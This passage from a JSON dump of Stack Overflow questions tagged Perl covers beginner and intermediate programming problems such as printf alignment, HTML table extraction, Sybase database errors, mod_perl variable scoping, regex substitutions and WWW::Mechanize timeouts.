Coke\",\"Onion Rings\");\nmy @prices = (3.49, 2.19, 1.69, 1.79, 1.59, 1.39, 1.19);\nmy @quantity = (3, 0, 0, 4, 0, 0, 8);\n\nprintf(\"%s %10s %12s %10s\\n\", \"Qty\", \"Desc.\", \"Unit \\$\", \"Total\");\n\nfor($meh = 0; $meh &lt;= 6; $meh++)\n{\n    if($quantity[$meh] != 0)\n    {\n        printf(\"%d %10s %9.2f %7.2f\\n\", $quantity[$meh], $selections[$meh], $prices[$meh], $prices[$meh]*$quantity[$meh])\n    }\n}\n</code></pre>\n\n<p>I can't figure out how to make the columns line up.  I followed the suggestions of another post, but it still isn't working.  I'd really appreciate some help.</p>\n"},{"tags":["perl","table","extract"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":32,"score":-1,"question_id":13040651,"title":"How to extract each table from multi-table html file to a new txt file","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13038441/extract-a-particular-table-from-multi-table-html-file-using-perl\">Extract a particular table from multi-table html file using perl</a>  </p>\n</blockquote>\n\n\n\n<p>I need to extract each table in a multi-table html file to a new text file. Can you please show me how to do this in perl using an example? Thanks</p>\n"},{"tags":["multithreading","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":142,"score":6,"question_id":13040333,"title":"What perl built in functions are atomic?","body":"<p>I'm writing some threaded code and I'm wondering what Perl built in functions and operators are atomic and safe to use on a shared variable without locking.  For example, I've been told <code>++</code>, <code>--</code>, <code>+=</code> and the like are not because they are implemented as two operations.</p>\n\n<p>Is there a list somewhere?  In particular are <code>push</code>, <code>pop</code>, <code>shift</code>, <code>unshift</code> and <code>splice</code> on a shared array atomic?</p>\n\n<p>Thanks.</p>\n"},{"tags":["perl","table","extract"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":13037220,"title":"Extract Table Contents using Perl","body":"<p>I am trying to extract table content from a html file using HTML::TableExtract. My problem is my html file is structured in the following way:</p>\n\n<hr>\n\n<pre><code>!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n    &lt;h4&gt;One row and three columns:&lt;/h4&gt;\n\n    &lt;table border=\"1\"&gt;\n      &lt;tr&gt;\n        &lt;td&gt;\n        &lt;p&gt; 100 &lt;/p&gt;&lt;/td&gt;\n        &lt;td&gt;\n        &lt;p&gt; 200 &lt;/p&gt;&lt;/td&gt;\n        &lt;td&gt;\n        &lt;p&gt; 300 &lt;/p&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n      &lt;tr&gt;\n        &lt;td&gt;\n        &lt;p&gt; 100 &lt;/p&gt;&lt;/td&gt;\n        &lt;td&gt;\n        &lt;p&gt; 200 &lt;/p&gt;&lt;/td&gt;\n        &lt;td&gt;\n        &lt;p&gt; 300 &lt;/p&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/table&gt;\n&lt;/body&gt;\n</code></pre>\n\n<h2>    </h2>\n\n<p>Because of this structure, my output looks like:</p>\n\n<hr>\n\n<pre><code>   100|\n\n   200|\n\n   300|\n\n   400|\n\n   500|\n\n   600|\n</code></pre>\n\n<hr>\n\n<h2>Instead of what I want:</h2>\n\n<pre><code>   100|200|300|\n   400|500|600|\n</code></pre>\n\n<hr>\n\n<p>Can you please help? Here is my perl code</p>\n\n<pre><code>use strict;\nuse warnings;\nuse HTML::TableExtract;\n\nmy $te = HTML::TableExtract-&gt;new();\n$te-&gt;parse_file('Table_One.html');\n\nopen (DATA2, \"&gt;TableOutput.txt\")\n    or die \"Can't open file\";\n\nforeach my $ts ($te-&gt;tables()) {\n\n    foreach my $row ($ts-&gt;rows()) {\n\n        my $Final = join('|', @$row );\n    print DATA2 \"$Final\";\n    }\n}\nclose (DATA2);\n</code></pre>\n"},{"tags":["perl","table","extract"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":46,"score":-1,"question_id":13038441,"title":"Extract a particular table from multi-table html file using perl","body":"<p>I have a html file with three tables. But I want to extract only one table of the three. How do I do this? Thanks</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":13037965,"title":"Trying to read elements in an array using a for loop","body":"<p>I'm trying to read elements from an array using a for loop, but I can't seem to get it working right.  When I run the program, it prints out a weird \"HASH\", or doesn't print out anything.  Can anyone help?</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\n\nmy $he;\nmy @selections = {\"Hamburger\",\"Frankfurter\",\"French Fries\",\"Large Coke\",\"Medium Coke\",\"Small Coke\",\"Onion Rings\"};\nmy @prices = {3.49, 2.19, 1.69, 1.79, 1.59, 1.39, 1.19};\n\nfor($he= 0; $he&lt;= 6; $he++)\n{\n      print \"@selections[$he]\";\n      print \"@prices[$he]\\n\";\n}\n</code></pre>\n"},{"tags":["perl","table","extract"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":13037888,"title":"Extract Contents from HTML Table","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/13037220/extract-table-contents-using-perl\">Extract Table Contents using Perl</a>  </p>\n</blockquote>\n\n\n\n<p>I am trying to extract table content from a html file using HTML::TableExtract. My problem is my html file is structured in the following way:</p>\n\n<hr>\n\n<pre><code>!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;body&gt;\n\n    &lt;h4&gt;One row and three columns:&lt;/h4&gt;\n\n    &lt;table border=\"1\"&gt;\n      &lt;tr&gt;\n        &lt;td&gt;\n        &lt;p&gt; 100 &lt;/p&gt;&lt;/td&gt;\n        &lt;td&gt;\n        &lt;p&gt; 200 &lt;/p&gt;&lt;/td&gt;\n        &lt;td&gt;\n        &lt;p&gt; 300 &lt;/p&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n      &lt;tr&gt;\n        &lt;td&gt;\n        &lt;p&gt; 100 &lt;/p&gt;&lt;/td&gt;\n        &lt;td&gt;\n        &lt;p&gt; 200 &lt;/p&gt;&lt;/td&gt;\n        &lt;td&gt;\n        &lt;p&gt; 300 &lt;/p&gt;&lt;/td&gt;\n        &lt;/tr&gt;\n    &lt;/table&gt;\n&lt;/body&gt;\n</code></pre>\n\n<h2>    </h2>\n\n<p>Because of this structure, my output looks like:</p>\n\n<hr>\n\n<pre><code>   100|\n\n   200|\n\n   300|\n\n   400|\n\n   500|\n\n   600|\n</code></pre>\n\n<hr>\n\n<h2>Instead of what I want:</h2>\n\n<pre><code>   100|200|300|\n   400|500|600|\n</code></pre>\n\n<hr>\n\n<p>Can you please help? Here is my perl code</p>\n\n<pre><code>use strict;\nuse warnings;\nuse HTML::TableExtract;\n\nmy $te = HTML::TableExtract-&gt;new();\n$te-&gt;parse_file('Table_One.html');\n\nopen (DATA2, \"&gt;TableOutput.txt\")\n    or die \"Can't open file\";\n\nforeach my $ts ($te-&gt;tables()) {\n\n    foreach my $row ($ts-&gt;rows()) {\n\n        my $Final = join('|', @$row );\n    print DATA2 \"$Final\";\n    }\n}\nclose (DATA2);\n</code></pre>\n"},{"tags":["regex","perl","escaping"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13037537,"title":"Using \\Q...\\E makes regex invalid Perl","body":"<p>below is my script that scans each line of the input file against list of annotations. for every occurance \nI tag the term from the line with the annotation tag. The regex works perfectly without \\Q..\\E operator, but if I don't include \\Q..\\E I get a range error. So In the situation below I have to keep substitution valid and at the same time take care of the range. Hope the question is clear.     </p>\n\n<pre><code> while (&lt;FILE&gt;) {\n\n     chomp $_;\n\n     foreach $word (@array) {\n\n         @cells   = split /\\t/, $word;\n         $value   = $cells[0];\n         $replace = $cells[1];\n\n         chomp $value;\n         chomp $replace;\n         $_=~s/\\Q\\b[\\w\\-]*$value[\\w\\-]*\\b\\E)/&lt;$replace&gt;$&amp;&lt;\\\\$replace&gt;/ig;\n     }\n     print $_,\"\\n\"; \n }\n</code></pre>\n"},{"tags":["eclipse","osx","perl","epic"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13036803,"title":"eclipse juno with EPIC","body":"<p>I'm installing EPIC within eclipse but always get an error:</p>\n\n<pre><code>Unable to read repository at http://e-p-i-c.sf.net/updates/testing/content.xml\n</code></pre>\n\n<p>I tried the second answer in <a href=\"http://stackoverflow.com/questions/7409691/eclipse-indigo-unable-to-connect-to-repository\">this post</a> which is:</p>\n\n<p>1) add the line in eclipse.ini: -Djava.net.preferIPv4Stack = true</p>\n\n<p>2) delete eclipse/p2/org.eclipse.equinox.p2.repository/cache directory</p>\n\n<p>But still get the error. However I can install CDT correctly.</p>\n\n<p>I'm using Mac OX Lion and Eclipse Classic 4.2.1 the mac os 64bit version. I also tried to switch to 32bit version but didn't work. Any help is appreciated.</p>\n"},{"tags":["database","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":96,"score":4,"question_id":13030663,"title":"DBLib error driving me crazy","body":"<p>I am working on a perl script that has multiple database calls and I continuously get the following error:</p>\n\n<p>DB-Library error:\n        Attempt to initiate a new SQL Server operation with results pending.</p>\n\n<p>In my code I have the following:</p>\n\n<p>The first call to the database performs a number of insert statements built from a hash:</p>\n\n<pre><code>while (my ($key, $value) = each(%holidays)) {\n\n    system(\"log4k\", \"DEBUG\", \"$0\", \"Staging holiday info data for: $cal_name: $key\");\n\n    $sql = \"INSERT INTO stg_holiday_data (hol_mnemonic, hol_date, hol_comment, dml_type)    VALUES (\\\"$cal_name\\\", $key, \\\"$value\\\", \\\"N\\\")\";\n    system(\"log4k\", \"TRACE\", \"$0\", \"SQL being executed: $sql\");\n\n    if ($test == 0) {\n\n        $dbh-&gt;dbcmd($sql);\n\n        ($dbh-&gt;dbsqlexec() &amp;&amp; $dbh-&gt;dbresults)\n            or &amp;fatalError(\"Database error in $sql\", \"DB_ERROR\");\n\n        while($dbh-&gt;dbresults != NO_MORE_RESULTS) {\n\n            while(my @dat = $dbh-&gt;dbnextrow){}\n        }\n    }\n}\n</code></pre>\n\n<p>immediately after that finishes I close off the connection, and cancel it to make sure that there are no results left to be processed by issuing:</p>\n\n<pre><code>$dbh-&gt;dbcancel();\n$dbh-&gt;dbclose();\n</code></pre>\n\n<p>From there I call a separate subroutine to execute a stored procedure which will produce three lines of output signifying row numbers:</p>\n\n<p>subroutine call </p>\n\n<pre><code>&amp;run_sproc() if ($test == 0);\n</code></pre>\n\n<p>subroutine:</p>\n\n<pre><code>sub run_sproc() {\n\n    system(\"log4k\", \"DEBUG\", \"$0\", \"Loading staged holiday data\");\n\n    my $sql1 = \"upd_holiday_data\";\n    system(\"log4k\", \"TRACE\", \"$0\", \"SQL being executed: $sql1\");\n\n    my($dbh2) = new Sybase::DBlib $ENV{DATABASE_USER}, $ENV{DATABASE_PASSWORD}, $ENV{DATABASE_SERVER}, \"GME_calendar_sync\";\n    &amp;fatalError(\"Failed to login imagine database\", \"DB_LOGIN_ERROR\") unless ($dbh2);\n\n    $dbh2-&gt;dbcmd($sql1);\n    ($dbh2-&gt;dbsqlexec() &amp;&amp; $dbh2-&gt;dbresults ) \n        or &amp;fatalError (\"Database error in $sql\", \"DB_ERROR\");\n\n    while ($dbh2-&gt;dbresults != NO_MORE_RESULTS) {\n\n        while (my @d = $dbh2-&gt;dbnextrow) {\n\n            system(\"log4k\", \"TRACE\", \"$0\", \"Next row being inserted @d\");\n        }\n    }\n    $dbh2-&gt;dbclose();\n}\n</code></pre>\n\n<p>I do have a third SQL block that comes after the stored procedure that works fine with or without this subroutine.</p>\n\n<p>What is happening is I am receiving the error mentioned above right before the results from the stored procedure print.  I have tried everything I can imagine to make sure that all the results are being processed.  A sample of the log output is below:</p>\n\n<pre><code>[Tuesday, 23 October 2012 13:30:02 BST] [DEBUG] gme_process_calendars.pl: Staging holiday info data for: CA: 20251226\n[Tuesday, 23 October 2012 13:30:03 BST] [TRACE] gme_process_calendars.pl: SQL being executed: INSERT INTO stg_holiday_data (hol_mnemonic, hol_date, hol_comment, dml_type)    VALUES (\"CA\", 20251226, \"upload\", \"N\")\n[Tuesday, 23 October 2012 13:30:03 BST] [DEBUG] gme_process_calendars.pl: Staging holiday info data for: CA: 20220103\n[Tuesday, 23 October 2012 13:30:03 BST] [TRACE] gme_process_calendars.pl: SQL being executed: INSERT INTO stg_holiday_data (hol_mnemonic, hol_date, hol_comment, dml_type) VALUES (\"CA\", 20220103, \"upload\", \"N\")\n[Tuesday, 23 October 2012 13:30:03 BST] [DEBUG] gme_process_calendars.pl: Loading staged holiday data\n[Tuesday, 23 October 2012 13:30:03 BST] [TRACE] gme_process_calendars.pl: SQL being executed: upd_holiday_data\nDB-Library error:\n    Attempt to initiate a new SQL Server operation with results pending.\n[Tuesday, 23 October 2012 13:30:03 BST] [TRACE] gme_process_calendars.pl: Next row being inserted 310107230\n</code></pre>\n\n<p>Any help with this would be greatly appreciated as I have already tried everything I can find doing an internet search and reading the documentation.</p>\n\n<p>Thanks </p>\n"},{"tags":["perl","function","hash","each","tie"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":69,"score":2,"question_id":13035823,"title":"What happens if we change/update a hash value inside an each loop?","body":"<p>The 'perldoc -f each' say me that is not safe delete or add a value while iterating, except if the item is the most recently returned by each().</p>\n\n<p>When I run this code snnipet:</p>\n\n<pre><code>my ($key,$value);\n\nmy %fruits = qw/ banana 1 apple 2 grape 3 /;\n\nwhile ( $key = each %fruits ) {\n    $fruits{$key} *= 7;\n    print \"$key = $fruits{$key}\\n\";\n}\n\nprint \"\\nRead only\\n\\n\";\n\nwhile ( ($key,$value) = each %fruits ) {\n    print \"$key = $value\\n\";\n}\n</code></pre>\n\n<p>everthing works fine!</p>\n\n<p>But if I use a tied hash, humnn:</p>\n\n<pre><code>#-------------------------------------------------------------------------------\n# select entries on database to print or to update.\nsub select_urls {\n    my ($dbPath,$match,$newValue) = @_;\n\n    tie(my %tiedHash,'DB_File',$dbPath,O_RDWR|O_EXLOCK,0600,$DB_BTREE) || die(\"$program_name: $dbPath: $!\\n\");\n\n    while ( my($key,$value) = each %tiedHash ) {\n        if ( $key =~ $match ){\n            if ( defined $newValue ) {\n                $tiedHash{$key} = $newValue;\n                ($key,$value) = each %tiedHash; # because 'each' come back 1 step when we update the entry\n                print \"Value changed --&gt; $key = $value\\n\";\n            } else {\n                print \"$key = $value\\n\";\n            }\n        }\n    }\n\n    untie(%tiedHash) ||  die(\"$program_name: $dbPath: $!\\n\");\n}\n</code></pre>\n\n<p>was necessary a second call to each().</p>\n\n<p>I have to 'perl -v':</p>\n\n<blockquote>\n  <p>$ perl -v</p>\n  \n  <p>This is perl 5, version 12, subversion 2 (v5.12.2 (*)) built for\n  amd64-openbsd (with 8 registered patches, see perl -V for more detail)</p>\n  \n  <p>Copyright 1987-2010, Larry Wall\n  ...</p>\n</blockquote>\n\n<p>I thinking if it's a bug?!!</p>\n\n<p>Perhaps much more things are behind the scenes...</p>\n\n<p>I asking if my solution is correct???</p>\n"},{"tags":["perl","scope","mod-perl","mod-perl2"],"answer_count":2,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":138,"score":5,"question_id":13024239,"title":"Moving from CGI to mod_perl. Understanding my, our, local","body":"<p>I've been using apache mod_cgi during some years. Now I am moving to mod_perl and I have found some problems, specially with subroutines. Until now I was never using <code>my</code>, <code>our</code> nor <code>local</code>; and the CGI scripts worked without problems. After reading documentation and even some previous questions posted here I understand more or less how <code>my</code>, <code>our</code> and <code>local</code> works. My concern is what information is going to be shared between the next requests (if I understand correctly, that's the main concern I must have while running mod_perl instead of mod_cgi).</p>\n\n<ul>\n<li>Is there any difference between using <code>our</code> in a scalar or just the scalar without declaring anything special such as <code>my</code>? Aren't both global?</li>\n<li>If I do not declare the scalar as private is going to be shared in the next request? Even in another request of a different perl script in the same server?</li>\n<li>How can I share the value of a scalar inside a subroutine to outside that subroutine but not outside the same file nor the same request?</li>\n<li>If I use a <code>my</code> in a scalar inside an <code>if</code> in the same level of the file or in the same subroutine, and after that I create another <code>if</code> where I use the same scalar; is that scalar shared between both <code>if</code> or each <code>if</code> means different blocks? What about <code>while</code> and <code>for</code>, are they different blocks for the previously declared as <code>my</code> scalar or that only works for subroutines and files? </li>\n</ul>\n"},{"tags":["perl","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":119,"score":-1,"question_id":12943256,"title":"Opening a text file as a hash and searching within that hash","body":"<p>I have an assignment to write a Perl file to open a text file of IP addresses and their hostnames, separated by a new line, and load it into a hash. I'm then supposed to ask for user input as to what the user would like to search for within the file. If a result is found, the program should print the value and key, and ask for input again until the user doesn't input anything. I'm not even close to the end, but need a bit of guidance. I've cobbed together some code from here and through using some Google-Fu.</p>\n\n<p>Here's my work in progress:</p>\n\n<pre><code>#!/usr/bin/perl\n\nprint \"Welcome to the text searcher! Please enter a filename: \";\n\n$filename = &lt;&gt;;\n\nmy %texthash = ();\n\nopen DNSTEXT, \"$filename\"\n    or die! \"Insert a valid name! \";\n\nwhile (&lt;DNSTEXT&gt;) {\n\n    chomp;\n    my ($key, $value) = split(\"\\n\"); \n\n    $texthash{$key} .= exists $texthash{$key} \n                     ? \",$value\" \n                     : $value;\n}\nprint $texthash{$weather.com}\n\n#print \"What would you like to search for within this file? \"\n\n#$query = &lt;&gt;\n\n#if(exists $text{$query}) {\n</code></pre>\n\n<p>As is probably glaringly obvious, I'm quite lost. I'm not sure if I'm inserting the file into the hash correctly, or how to even print a value to debug.</p>\n"},{"tags":["c++","perl","cpan"],"answer_count":2,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":263,"score":7,"question_id":7888559,"title":"How to get started writing Perl bindings for a C++ library?","body":"<p>I want to write Perl bindings for a C++ library, so that the library can be used from Perl. How would I get started doing this? I've written pure-Perl modules for CPAN before.</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12684184,"title":"How to search for alphanumeric word before or after a keyword in perl?","body":"<p>I have sentences as shown in the below examples:</p>\n\n<pre><code>$sen1 = \"The quick brown fox jump KEYWORD over123 the3 lazy dog, fox is quick\";\n\n$sen2 = \"The quick brown fox jump123 KEYWORD over the lazy dog, fox is quick\"; \n</code></pre>\n\n<p>i want to use the keyword 'KEYWORD' as my search string to extract the alphanumeric words before and after the search string using Perl regular expression.</p>\n\n<p>sample output:</p>\n\n<p><strong>over123</strong></p>\n\n<p><strong>jump123</strong></p>\n\n<p>NB: The word 'the3' is left out because i'm only searching for alphanumeric words exactly before or after the 'KEYWORD'.</p>\n\n<p>Thanks </p>\n"},{"tags":["perl","hadoop-streaming","amazon-emr"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":12809163,"title":"Elastic MapReduce bootstrap to install Perl modules","body":"<p>I'm trying to write a Perl script that will run as a mapper under Elastic MapReduce's Streaming capability. I'm trying to use Net::Amazon::S3 (or the supposedly more portable Amazon::S3) to do some extra I/O of files from and to S3. That module is not on the default AMI, so I'm trying to use CPAN in a bootstrap-action script to install it. The bootstrap script currently contains:</p>\n\n<p>perl -MCPAN -e 'CPAN::Shell->install(Amazon::S3)'</p>\n\n<p>however, after 15 minutes the bootstrap action has still not completed, so I assume it is waiting for some kind of input. I've looked around but have not found any examples of bootstrap-action scripts that load Perl modules. Can someone advise me on that? </p>\n\n<p>Thanks in advance...</p>\n"},{"tags":["regex","perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":11995594,"title":"replacing the dot with <br /> using regex in perl","body":"<p>I am using this example:</p>\n\n\n\n<blockquote>\n  <p><code>New Zealand cyclist Jack Bauer didn't know it during the Olympic road race, but there was a scantily-clad Kiwi 'snow angel' above him. http://www.stuff.co.nz/sport/olympics/7374497/Near-naked-snow-angel-over-cycle-road-race</code></p>\n</blockquote>\n\n<p>I want to add a <code>&lt;br /&gt;</code> tag after the full stop but not in HTTP link. Just at the end of the sentence.</p>\n\n<p>Currently I am using :</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$full_story = $read_story-&gt;[0]{story_text}; \n$full_story =~ s/(\\D)\\.(\\D)/&lt;br \\/&gt;&lt;br \\/&gt;/i;\n</code></pre>\n\n<p>Using this code it adds the <code>&lt;br /&gt;</code> but the <code>m</code> from <code>him</code> is being removed.</p>\n\n<p>Final Result:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>New Zealand cyclist Jack Bauer didn't know it during the Olympic road race, but there was a scantily-clad Kiwi 'snow angel' above him.\n\nhttp://www.stuff.co.nz/sport/olympics/7374497/Near-naked-snow-angel-over-cycle-road-race\n</code></pre>\n\n<p>What am I doing wrong?</p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":92,"score":0,"question_id":13010203,"title":"Comparing two URLs","body":"<p>I need to compare two URLs in Perl.</p>\n\n<p>URLs consisting of a DOMAIN only or DOMAIN/ (with the root URL ending with slash) are equivalent.</p>\n\n<p>That said, the following strings should be count equal:\n\"http://example.com\" and \"http://example.com/\".</p>\n"},{"tags":["perl","https","timeout","try-catch","www-mechanize"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":118,"score":3,"question_id":12964503,"title":"WWW::Mechanize::Timed https timeout does not work","body":"<p>So I've researched to the ends of the internet (at least I think so) about this issue. I'm trying to set an <code>alarm</code> timeout of 60 seconds for a <code>get()</code> but it does not get caught and will run past 60 seconds, also any time the default timeout (180 sec) is reached for the www::mechanized::timed constructor, I get the error below:</p>\n\n<p>Use of uninitialized value in addition (+) at /usr/lib/perl5/site_perl/5.10.0/WWW/Mechanize/Timed.pm line 52.</p>\n\n<p>code:</p>\n\n<pre><code>use WWW::Mechanize::Timed;\nuse HTTP::Cookies;\nuse Try::Tiny;\n\nmy $ua = WWW::Mechanize::Timed-&gt;new();\n\nmy $cookies = HTTP::Cookies-&gt;new(\nautosave =&gt; 1\n);\n\n$ua-&gt;cookie_jar($cookies);\n\n$ua-&gt;agent_alias(\"Windows IE 6\");\n\ntry{\nlocal $SIG{ALRM} = sub { die \"alarm\\n\" };\nalarm 60;\n$ua-&gt;get('https://secure.site.com'); #secure site that timed out\nalarm 0;\n} catch {\ndie $_ unless $_ eq \"alarm\\n\";\nprint \"page timed out after 60 seconds!\\n\";\nexit;\n};\n\nmy $total_time = sprintf '%.3f', ($ua-&gt;client_elapsed_time);\n\nunless($ua-&gt;success){\nprint \"Error: \" . $ua-&gt;status;\nexit;\n}\n...\n</code></pre>\n\n<p>I've gone over these questions to figure out how to get alarm to work without writing my own timeout function.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/5209915/perl-mechanize-timeout-not-working-with-https\">Perl Mechanize timeout not working with https</a>\nand\n<a href=\"http://stackoverflow.com/questions/2423288/ways-to-do-timeouts-in-perl\">Ways to do timeouts in Perl?</a></p>\n\n<p>So far I see recommendations for using LWPx::ParanoidAgent, not sure if I understand the \"Use LWPx::ParanoidAgent and mix it into Mech\" part</p>\n\n<p><a href=\"http://stackoverflow.com/questions/11330610/possible-to-use-timeout-in-wwwmechanize-on-https\">Possible to use timeout in WWW::Mechanize on https?</a></p>\n\n<p>or patching LWP::UserAgent with</p>\n\n<p><a href=\"http://search.cpan.org/~sharyanto/LWP-UserAgent-Patch-HTTPSHardTimeout-0.04/lib/LWP/UserAgent/Patch/HTTPSHardTimeout.pm\" rel=\"nofollow\">http://search.cpan.org/~sharyanto/LWP-UserAgent-Patch-HTTPSHardTimeout-0.04/lib/LWP/UserAgent/Patch/HTTPSHardTimeout.pm</a></p>\n\n<p>Any thoughts on how to get the timeout to work with alarm?</p>\n\n<p>Thanks!</p>\n"},{"tags":["arrays","perl","function","return"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":108,"score":4,"question_id":13001814,"title":"Parsing an array line by line and exploding it into more arrays (Solved)","body":"<p>I am still earning Perl , and know I have quite a way to go, I've been reading the Perl books from O'Reilly and also taking some classes on Udemy, and even went through the Lynda course on Perl. </p>\n\n<p>I am trying to write a backup program to scratch a need I have, but I seem to be having a really hard time with one of my functions.</p>\n\n<pre><code>sub list {\n    my @zfs_temp = `zfs list`;\n    foreach (@zfs_temp) {\n    my ($name, $used, $available, $refer, $mount) = split(/\\s+/);\n    push(@name, $name);\n    push(@used, $used);\n    push(@available, $available);\n    push(@refer, $refer);\n    push(@mount, $mount);\n#    print \"@name, @used, @available, @refer, @mount\\n\";\n    return (@name, @used, @available, @refer, @mount);\n    }\n}\n</code></pre>\n\n<p>It seems that I am only getting back one line , and I'm really not sure what I am doing wrong, could anyone point me in the right direction?</p>\n\n<p>Thank You</p>\n"},{"tags":["perl","exe","privileges","par"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":13030913,"title":"How to call \"Privilege user dialog exe file\" by PAR(perl)","body":"<p>How to double click PAR(exe) and open \"Privilege dialog\"?</p>\n\n<p>Here is my code:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse utf8;\nuse Win32::GuiTest qw/:ALL/;\nuse Win32::Clipboard;\nuse Win32::Exe;\nmy $exe=Win32::Exe-&gt;new('C:\\Users\\treeboa\\perl\\pic.exe');\nmy $manifest=$exe-&gt;get_manifest;\n$manifest-&gt;set_execution_level('requireAdministrator');\n$exe-&gt;set_manifest($manifest);\n$exe-&gt;write;\n\n..........\n..........\nProcessing\n..........\nend\n</code></pre>\n\n<p>Manifest file:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?&gt;\n&lt;assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"&gt;\n&lt;assemblyIdentity\n   name=\"pic.exe\"\n   processorArchitecture=\"X86\"\n   version=\"1.0.0\"\n   type=\"win32\"/&gt;\n&lt;description&gt;My Vista compatible application&lt;/description&gt;\n&lt;trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"&gt;\n   &lt;security&gt;\n      &lt;requestedPrivileges&gt;\n         &lt;requestedExecutionLevel\n            level=\"requireAdministrator\"\n            uiAccess=\"False\"/&gt;\n      &lt;/requestedPrivileges&gt;\n   &lt;/security&gt;\n&lt;/trustInfo&gt;\n</code></pre>\n\n<ol>\n<li>pic.pl  ->  pp -o pic.exe pic.pl  -> pic.exe (code)</li>\n<li>(pic.exe &amp; pic.exe.manifest) -> same folder (manifest file)</li>\n<li>double-click (pic.exe)</li>\n<li><strong>Privilege user's dialog is not opened</strong></li>\n</ol>\n\n<p><a href=\"http://stackoverflow.com/questions/4441767/how-do-i-run-a-par-packed-file-in-windows-vista-or-windows-7-running-with-higher\">Here is a related question.</a></p>\n\n<p>Here is <a href=\"http://search.cpan.org/~mdootson/Win32-Exe-0.17/lib/Win32/Exe.pm\" rel=\"nofollow\">documentation for <code>Win32::Exe</code></a>.</p>\n"},{"tags":["perl","sqlite","dbi"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":13016100,"title":"how to query sqlite for certain rows, i.e. dividing it into pages (perl DBI)","body":"<p>sorry for my noob question,\nI'm currently writing a perl web application with sqlite database behind it.\nI would like to be able to show in my app query results which might get thousands of rows - these should be split in pages - routing should be like /webapp/N  - where N is the page number.\nwhat is the correct way to query the sqlite db using DBI, in order to fetch only the relavent rows.</p>\n\n<p>for instance, if I show 25 rows per page so I want to query the db for 1-25 rows in the first page, 26-50 in the second page etc....</p>\n\n<p>Thanks in advanced!</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":2540,"score":5,"question_id":7406807,"title":"Find Size of Array in Perl","body":"<p>I'm learning perl and I seem to have come across several different ways to find the size of an array. What is the difference between these three methods?</p>\n\n<pre><code>my @arr = (2);\nprint scalar @arr; # first way to print array size\nprint $#arr; # second way to print array size\nmy $arrSize = @arr;\nprint $arrSize; # third way to print array size\n</code></pre>\n"},{"tags":["perl","parsing","hash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":83,"score":2,"question_id":13022055,"title":"Parsing a file with repeating sections in Perl","body":"<p>I'm trying to use Perl to parse a file that has repeating sections like this:   </p>\n\n<pre>\nSystem:      server1.domain.com\nStart Time:  20121021T01:00:56\nStop Time:   20121021T01:00:56\nReturn Code: 0\n\nOutput\n------\nuser1\nuser2\nuser3\n\n##############################\n\nSystem:      server2.domain.com\nStart Time:  20121021T01:00:56\nStop Time:   20121021T01:00:56\nReturn Code: 0\n\nOutput\n------\nuser1\nuser4\nuser5\nuser6\n\n</pre>\n\n<p>I'm able to set the input record separator to \"##############################\" which will give me each block as a separate record.   </p>\n\n<p>But I need to be able to populate a hash with the usernames as keys for each server.</p>\n\n<p>What's the best way to accomplish this?</p>\n"},{"tags":["perl","sorting","numeric"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":117,"score":0,"question_id":13025881,"title":"Perl : sort <=> not working","body":"<p>I am not sure why this Perl sorting is not working.\nPlease suggest how to resolve this.</p>\n\n<pre><code>while (&lt;&gt;) {\n\n    chomp;\n    if (/VIOLATE/) {\n\n        @lines = split \" \", $_;\n        #print \"$lines[-2]\\n\";  ## Print last but one column\n        my @viol = \"$lines[-2]\\n\";\n\n        